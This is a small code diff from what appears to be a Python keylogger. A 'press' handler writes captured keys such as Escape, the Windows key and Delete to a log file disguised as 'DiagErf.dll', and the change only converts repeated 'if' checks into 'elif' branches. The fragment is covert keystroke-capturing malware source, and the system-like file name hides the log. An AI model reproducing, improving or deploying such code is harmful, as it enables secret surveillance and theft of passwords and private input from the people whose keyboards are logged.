@@ -68,12 +68,12 @@ def press(key):
             info()
             file.writelines("<esc>")
             file.close()
-        if key == keyboard.Key.cmd_l or key == keyboard.Key.cmd_r:
+        elif key == keyboard.Key.cmd_l or key == keyboard.Key.cmd_r:
             file = open('DiagErf.dll', 'a')
             info()
             file.writelines("<win>")
             file.close()
-        if key == keyboard.Key.delete:
+        elif key == keyboard.Key.delete:
             file = open('DiagErf.dll', 'a')
             info()
             file.writelines("<delete>")
